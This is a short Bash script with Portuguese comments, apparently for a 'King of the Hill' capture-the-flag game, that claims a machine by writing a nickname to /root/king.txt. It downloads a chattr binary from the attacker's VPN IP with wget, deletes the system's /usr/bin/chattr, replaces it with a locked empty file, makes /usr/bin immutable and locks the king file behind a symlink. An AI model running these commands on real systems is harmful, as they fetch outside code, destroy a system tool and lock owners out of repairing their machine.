 #!/bin/bash
if [ "$1" == "" ] || [ "$2" == "" ];
    then
         echo "[-] Uso: bash king.sh (nickname) (vpnip)"
         exit 1
    else
         # Caminho para o arquivo king.txt
         king_file="/root/king.txt"
         # Obtém o conteúdo atual do arquivo king.txt
         king=$(cat $king_file)
         # Baixa o binário chattr e o renomeia para ftr
         wget -q $2/chattr
         mv chattr ftr
         chmod +x ftr
         # Remove o chattr existente e cria um novo arquivo vazio
         rm -rf /usr/bin/chattr
         touch /usr/bin/chattr
         chmod a-rwx /usr/bin/chattr
         #XXX
         # Move o binário ftr para /usr/bin
         mv ftr /usr/bin
         # Define as permissões de proteção no arquivo vazio chattr
         ftr +i /usr/bin/chattr
         ftr +i /usr/bin
         # Protege o arquivo king.txt
         ftr -iaet /root/king.txt && rm -rf /root/king.txt && echo $1 > /mnt/king.txt
         ln -s /mnt/king.txt /root/king.txt && ftr +i /mnt/king.txt && ftr +i /root/king.txt
         # Verifica se ocorreram erros nos comandos anteriores
    if [ "$?" -eq 0 ]; then
         # Exibe a mensagem de sucesso
        echo "[+] Bem vindo $king, você foi coroado o novo Rei do jogo!"
    else
        echo "Ocorreu um erro ao proteger o king.txt."
    fi
fi
